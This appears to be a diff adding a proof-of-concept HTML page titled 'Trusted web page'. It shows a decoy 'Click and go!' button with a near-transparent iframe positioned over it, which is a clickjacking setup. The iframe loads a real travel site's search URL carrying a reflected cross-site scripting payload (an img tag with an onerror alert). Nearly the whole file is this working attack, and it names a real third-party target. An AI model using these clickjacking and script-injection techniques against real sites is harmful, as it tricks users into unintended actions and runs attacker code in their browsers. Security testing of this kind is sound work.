@@ -1,1 +1,51 @@
 
+<html>
+	<head>
+		<title>Trusted web page</title>
+		
+		<style type="text/css"><!-- 
+			*{ 
+				margin:0; 
+				padding:0;
+			}
+			body {  
+				background:#ffffff;
+			}
+			.button
+			{
+				padding:5px;
+				background:#6699CC;
+				left:205px;
+				width:120px;
+				border: 1px solid #336699;
+			}
+			#content {
+				width: 500px;
+				height: 500px;
+				margin-top: 150px ;
+				margin-left: 500px;
+			}
+			#clickjacking
+			{ 
+ 				position: absolute; 
+				left: 218px; 
+				top: 107px; 
+				filter: alpha(opacity=0); 
+				opacity:0.5
+			} 
+		//--></style>
+		
+	</head>
+	<body>
+		<div id="content">
+			<h1>www.owasp.com</h1>
+			<form action="http://www.owasp.com">
+				<input type="submit" class="button" value="Click and go!">
+			</form>
+		</div>
+
+                <iframe id="clickjacking" src="https://www.tripadvisor.in/Search?q=%27%22%3E%3Cimg%20src=x%20onerror=alert(6666)%3E
+" width="500" height="500" scrolling="no" frameborder="none">
+                </iframe>
+	</body>
+</html>
